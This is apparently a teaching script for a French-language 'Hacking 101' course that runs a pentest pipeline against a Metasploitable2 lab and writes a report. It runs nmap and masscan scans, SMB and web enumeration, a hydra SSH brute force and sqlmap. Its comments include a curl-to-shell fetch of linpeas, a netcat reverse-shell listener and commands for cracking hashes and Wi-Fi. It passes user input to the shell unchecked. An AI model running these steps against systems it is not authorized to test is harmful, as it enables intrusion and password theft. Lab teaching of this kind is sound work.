#!/usr/bin/env python3
"""
Tisseur — cours Hacking 101

Tisse ensemble les outils des 6 modules (Reconnaissance, Scanning,
Énumération, Exploitation, Post-Exploitation, Outils Avancés) : il
les exécute UN PAR UN, en attendant que chaque étape soit
complètement terminée avant de passer à la suivante, puis tisse
tous les résultats en un seul rapport final (.md).

USAGE :
    python3 tisseur.py --target <ip> [--url <url>] [--modules <liste>]

EXEMPLES :
    # Rouler le pipeline complet sur ton lab Metasploitable2
    python3 tisseur.py --target 192.168.56.102

    # Rouler juste certains modules
    python3 tisseur.py --target 192.168.56.102 --modules Reconnaissance,Scanning

    # Préciser une URL différente pour les outils web
    python3 tisseur.py --target 192.168.56.102 --url http://192.168.56.102:8080

⚠️ À utiliser seulement sur des machines que tu possèdes ou que t'as
le droit explicite de tester (ton lab Metasploitable2, etc.)
"""

import argparse
import subprocess
import sys
import datetime

# ============================================================
# BANNIÈRE ASCII — même police (figlet "slant") que tes autres
# outils (scan-info-id-espion), colorée rouge/blanc comme le logo
# ============================================================
RESET = "\033[0m"
WHITE = "\033[1;97m"
RED_BRIGHT = "\033[1;91m"
RED_DARK = "\033[2;31m"

LOGO_TISSEUR = r"""
  ____________________ ________  ______
 /_  __/  _/ ___/ ___// ____/ / / / __ \
  / /  / / \__ \\__ \/ __/ / / / / /_/ /
 / / _/ / ___/ /__/ / /___/ /_/ / _, _/
/_/ /___//____/____/_____/\____/_/ |_|
"""

def print_banner():
    use_color = sys.stdout.isatty()

    lines = LOGO_TISSEUR.strip("\n").split("\n")
    width = max(len(l) for l in lines)
    n = len(lines)

    for i, line in enumerate(lines):
        if not use_color:
            print(line)
            continue
        # dégradé du haut (blanc, highlight) vers le bas (rouge foncé,
        # ombre) — même logique que le relief 3D du logo
        if i < n * 0.3:
            color = WHITE
        elif i < n * 0.75:
            color = RED_BRIGHT
        else:
            color = RED_DARK
        print(f"{color}{line}{RESET}")

    tagline = "— tisse tes commandes de pentest, une à la fois —"
    tagline = tagline.center(width)
    print(f"{RED_BRIGHT}{tagline}{RESET}" if use_color else tagline)
    print()


# ============================================================
# CONFIGURATION DES ÉTAPES
# (module, nom, commande) — {target} et {url} sont remplacés
# automatiquement. Une ligne commentée (#) = pas exécutée par
# défaut, parce qu'elle a besoin d'un setup différent (expliqué
# juste à côté). Décommente-la une fois ce setup fait.
# ============================================================
STEPS = [
    # ---------------- RECONNAISSANCE ----------------
    ("Reconnaissance", "Ping", "ping -c 4 {target}"),
    ("Reconnaissance", "Whois", "whois {target}"),
    # theHarvester sert à chercher des emails/sous-domaines d'un NOM DE
    # DOMAINE public (ex: exemple.com), pas d'une IP de lab privé :
    # ("Reconnaissance", "theHarvester", "theHarvester -d {target} -b all"),

    # ---------------- SCANNING ----------------
    ("Scanning", "Nmap - scan complet (ports + versions)", "nmap -sV -sC -p- {target}"),
    ("Scanning", "Masscan - scan rapide tous ports", "masscan -p1-65535 {target} --rate=1000"),
    # Legion = GUI qui automatise nmap + plein d'outils d'énumération
    # tout seul (fork de Sparta). C'est une interface graphique, pas
    # vraiment lançable en une ligne de commande comme les autres —
    # tu le démarres pis tu rentres l'IP dedans directement :
    #   legion


    # ---------------- ÉNUMÉRATION ----------------
    ("Énumération", "SMB enum", "enum4linux -a {target}"),
    ("Énumération", "Dossiers/fichiers web (gobuster)", "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt"),
    ("Énumération", "Scan vulnérabilités web (nikto)", "nikto -h {url}"),
    ("Énumération", "SNMP walk", "snmpwalk -v2c -c public {target}"),

    # ---------------- EXPLOITATION ----------------
    ("Exploitation", "Hydra - brute force SSH", "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://{target}"),
    ("Exploitation", "sqlmap - test injection SQL", "sqlmap -u {url} --batch --banner"),
    # Metasploit s'automatise avec un "resource script" (.rc) préparé
    # d'avance — remplace mon_script.rc par le tien :
    # ("Exploitation", "Metasploit (resource script)", "msfconsole -q -r mon_script.rc"),
    # Burp Suite est surtout un outil interactif (proxy GUI) — pas
    # vraiment automatisable dans un pipeline CLI comme celui-ci.

    # ---------------- POST-EXPLOITATION ----------------
    # Ces étapes supposent que t'as DÉJÀ un accès/shell sur la machine
    # (donc après l'étape Exploitation, une fois dedans) — à rouler
    # manuellement dans ce shell, pas dans ce pipeline automatique :
    #   linPEAS (énum. de privilege escalation Linux, dans Metasploitable2) :
    #     curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
    #   netcat (reverse shell) : nc -lvnp 4444   (sur ta Kali, en écoute)
    #   Mimikatz : outil propre à Windows/Active Directory — ne s'applique
    #   pas à Metasploitable2, qui est du Linux.

    # ---------------- OUTILS AVANCÉS ----------------
    ("Outils avancés", "Capture réseau (tcpdump, 15s)", "timeout 15 tcpdump -i eth0 -w capture.pcap"),
    # John / Hashcat ont besoin d'un FICHIER DE HASH en entrée (pas
    # juste une IP) — à utiliser une fois que t'as récupéré des hash :
    # ("Outils avancés", "John the Ripper", "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"),
    # ("Outils avancés", "Hashcat", "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"),
    # Aircrack-ng s'applique au WIFI (interface sans fil en mode
    # monitor), pas à une cible réseau filaire comme Metasploitable2 :
    # ("Outils avancés", "Aircrack-ng", "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap"),
    # Wifite = automatise les attaques wifi (WEP/WPA/WPS) en enchaînant
    # plusieurs outils (aircrack-ng, reaver, etc.) tout seul. Même chose
    # que Aircrack-ng : demande une interface wifi en mode monitor, pas
    # une IP — remplace {interface} par la tienne (ex: wlan0) :
    # ("Outils avancés", "Wifite", "wifite -i {interface} --kill"),
]


def run_step(module, name, cmd_template, target, url, report_lines):
    cmd = cmd_template.format(target=target, url=url)

    print(f"\n{'=' * 60}")
    print(f"[{module}] {name}")
    print(f"Commande : {cmd}")
    print(f"{'=' * 60}\n")

    report_lines.append(f"\n## [{module}] {name}\n")
    report_lines.append(f"Commande : `{cmd}`\n")
    report_lines.append("```")

    try:
        # subprocess.run() BLOQUE et attend que la commande soit
        # complètement terminée avant de rendre la main — c'est ça
        # qui garantit que les étapes se font une à la fois, en ordre.
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=600
        )
        output = (result.stdout or "") + (result.stderr or "")
        print(output)
        report_lines.append(output.strip())
    except subprocess.TimeoutExpired:
        msg = "⚠️ Étape interrompue (timeout de 10 minutes dépassé)"
        print(msg)
        report_lines.append(msg)
    except Exception as e:
        msg = f"⚠️ Erreur pendant cette étape : {e}"
        print(msg)
        report_lines.append(msg)

    report_lines.append("```")


def main():
    parser = argparse.ArgumentParser(description="Tisseur — pipeline de pentest, Hacking 101")
    parser.add_argument("--target", required=True, help="IP ou host de la cible")
    parser.add_argument("--url", default=None, help="URL pour les outils web (défaut: http://<target>)")
    parser.add_argument("--modules", default=None,
                         help="Liste de modules séparés par virgule (défaut: tous). "
                              "Ex: Reconnaissance,Scanning")
    args = parser.parse_args()

    print_banner()

    target = args.target
    url = args.url or f"http://{target}"
    wanted_modules = [m.strip() for m in args.modules.split(",")] if args.modules else None

    steps_to_run = [s for s in STEPS if wanted_modules is None or s[0] in wanted_modules]

    if not steps_to_run:
        print("Aucune étape ne correspond aux modules demandés.")
        print("Modules disponibles :", sorted(set(s[0] for s in STEPS)))
        sys.exit(1)

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_lines = [f"# Rapport Tisseur — Cible : {target}", f"Généré le {timestamp}\n"]

    print(f"🧵 Tisseur démarré sur la cible {target}")
    print(f"{len(steps_to_run)} étape(s) à exécuter, une par une.\n")

    for module, name, cmd_template in steps_to_run:
        run_step(module, name, cmd_template, target, url, report_lines)

    filename = (
        f"tisseur_rapport_{target.replace('.', '_')}_"
        f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    )
    with open(filename, "w") as f:
        f.write("\n".join(report_lines))

    print(f"\n{'=' * 60}")
    print(f"✅ Tisseur terminé. Rapport sauvegardé : {filename}")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
